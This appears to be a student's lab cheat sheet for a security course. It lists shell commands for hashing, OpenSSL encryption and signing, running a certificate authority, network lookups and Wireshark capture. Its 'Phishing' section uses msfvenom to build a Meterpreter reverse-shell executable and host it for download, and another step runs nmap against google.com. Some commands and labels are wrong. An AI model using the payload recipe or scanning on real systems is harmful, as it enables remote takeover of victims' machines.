
Important commands:
ifconfig
nano
cat
pwd		//to see curr path
cd ..		//go back in path

------------------------------------------------------------------------------------------------------------------------

SHA 512/256

 - nano sample.txt			//create file

 - cat sample.txt

 - sha256sum sample.txt		//sha 256

 - sha512sum sample.txt		//sha 512

 - sha1sum sample.txt                 	//sha 128

------------------------------------------------------------------------------------------------------------------------

Phishing
- sudo su
- cd /var/www/html
- mkdir daivik
- cd daivik
- msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx lport=4443 -f exe -o /var/www/html/daivik/bomber.exe

- sudo service apache2 start
- also go to mozilla and pout xxxIP/daivik and download bomber.exe

- then go to virus total and upload bomber.exe

------------------------------------------------------------------------------------------------------------------------
AES encrypt/decrypt
types:
aes-256-ecb 
aes-256-cbc 
aes-128-cbc
==>
openssl version
nano msg
cat msg
openssl enc -aes-256-cbc -base64 -in msg -out enc1
cat enc1
openssl enc -aes-256-cbc -d -base64 -in enc1 -out dec1
cat dec1

------------------------------------------------------------------------------------------------------------------------

Answer the below Questions:
 Find out the IP address of the google.com.
 Identify how many hops passed to reach the server google.com
 Find out how many ports are open in the google.com

nslookup google.com
traceroute -n google.com
sudo nmap google.com

------------------------------------------------------------------------------------------------------------------------

RSA encrpt/decrypt

user A

cd Desktop
mkdir A
cd A
openssl genrsa -out privateA.pem 2048
cat privateA.pem
openssl rsa -in privateA.pem -text
openssl rsa -in privateA.pem -pubout -out publicA.pem
ls
cp /home/student/Desktop/B/publicB.pem publicB.pem
nano msg
cat msg
openssl rsautl -encrypt -in msg -out enc -inkey publicB.pem -pubin

user B

cd Desktop
mkdir B
cd B
openssl genrsa -out privateB.pem 2048
cat privateB.pem
openssl rsa -in privateB.pem -text
openssl rsa -in privateB.pem -pubout -out publicB.pem
ls
cp /home/student/Desktop/A/publicA.pem publicA.pem
cp /home/student/Desktop/A/enc enc
openssl pkeyutl -decrypt -in enc -out msg -inkey privateB.pem


------------------------------------------------------------------------------------------------------------------------

Digital Signature

User A

cd Desktop
mkdir A
cd A
openssl genrsa -out privateA.pem 2048
cat privateA.pem
openssl rsa -in privateA.pem -text
openssl rsa -in privateA.pem -pubout -out publicA.pem
ls
nano msg
cat msg
openssl rsautl -sign -in msg -out signed -inkey privateA.pem
openssl pkeyutl -verify -pubin -inkey publicJ.pem -in msg -sigfile signed

User B

cd Desktop
mkdir B
cd B
openssl genrsa -out privateB.pem 2048
cat privateB.pem
openssl rsa -in privateB.pem -text
openssl rsa -in privateB.pem -pubout -out publicB.pem
ls
cp /home/student/Desktop/A/signed signed
cp /home/student/Desktop/A/msg msg
cp /home/student/Desktop/A/publicA.pem publicA.pem
cp /home/student/Desktop/A/privateA.pem privateA.pem
openssl rsautl -verify -in signed -out doc -inkey publicA.pem -pubin
openssl pkeyutl -verify -pubin -inkey publicJ.pem -in msg -sigfile signed


------------------------------------------------------------------------------------------------------------------------

Certificate

# 1) Check OpenSSL Version
openssl version

# 2) Edit CA Script
cd ..
nano /usr/lib/ssl/misc/CA.pl
# Change CATOP = "/root/demoCA" to CATOP = "./demoCA"

# 3) Edit OpenSSL Configuration
nano /usr/lib/ssl/openssl.cnf
# Change dir = "/root/demoCA" to dir = "./demoCA"

# 4) Create Certificate Authority (CA)
cd ~
/usr/lib/ssl/misc/CA.pl -newca
# Enter password and details as prompted
ls
cd demoCA

# 5) Validate User
openssl req -new -keyout privateuser.pem -out requser.pem
# Enter password and details as prompted
ls
cd demoCA

# 6) CA Signing the User Certificate
openssl ca -in requser.pem
# Enter password, confirm prompts with yes
# This will generate the signed certificate: certif.pem

# 7) Verify Certificate
cd demoCA/newcerts
ls
openssl verify -CAfile ../cacert.pem certif.pem

--------

1. Openssl version 

2. Nano /usr/lib/ssl/misc/CA.pl 
Change, CATOP = “/root/demoCA” to CATOP = “./demoCA”

3. Nano /usr/lib/ssl/openssl.cnf 
Change, dir = “/root/demoCA” to dir = “./demoCA” 

4. Creating CA 
1. Open terminal and be in the home folder only 
2. /usr/lib/ssl/misc/CA.pl –newca 
3. Enter 
4. Enter any password (remember throughout the practical) 
5. Enter all the details (remember throughout the practical) 
6. Enter 
7. Enter 
8. Enter the password 
9. ls 
10. cd demoCA 

5. Validating User 
1. Openssl req –new –keyout privateuser.pem –out requser.pem 
2. Enter password 
3. Enter all the details (remember throughout the practical) 
4. Enter 
5. Enter 
6. Enter the password 
7. ls 
8. cd demoCA 

6. CA Signing the user document 
1. openssl ca –in requser.pem 
2. enter password 
3. yes 
4. yes 

7. CA verifying the certificate 
1. cd /demoCA 
2. cd newcerts 
3. ls 
4. openssl verify –CAfile 
demoCA/cacert.pemdemoCA/newcerts/D2356899488954156892.pem
If you’re inside the demoCA folder:
openssl verify -CAfile cacert.pem newcerts/D2356899488954156892.pem


------------------------------------------------------------------------------------------------------------------------


HTTP Packet Analysis using Wireshark in Ubuntu

Steps:
Open Wireshark → start capture on active interface.
Use filter: http.
Visit an HTTP site (e.g., http://example.com).
Observation:

Packets show GET, POST, and 200 OK messages.
Data (headers, URLs, content) is visible in plain text.
No encryption — insecure communication.

HTTPS Packet Analysis using Wireshark in Ubuntu

Steps:
Start Wireshark → capture on interface.
Use filter: tls or ssl.
Visit an HTTPS site (e.g., https://example.com).

Observation:
Shows packets like Client Hello, Server Hello, Certificate, Change Cipher Spec.
After handshake, data appears as Encrypted Application Data.
Communication is encrypted and secure.

----

HTTP Packet Analysis using Wireshark in Ubuntu

Steps:
Open Terminal → run sudo wireshark to start Wireshark.
Select your network interface (e.g., eth0 or wlan0) and click Start.
In the filter bar, type http and press Enter.
Open Firefox and visit http://example.com.

HTTPS Packet Analysis using Wireshark in Ubuntu

Steps:
Run sudo wireshark and start capture.
Apply filter tls or ssl.
Visit https://example.com in Firefox.



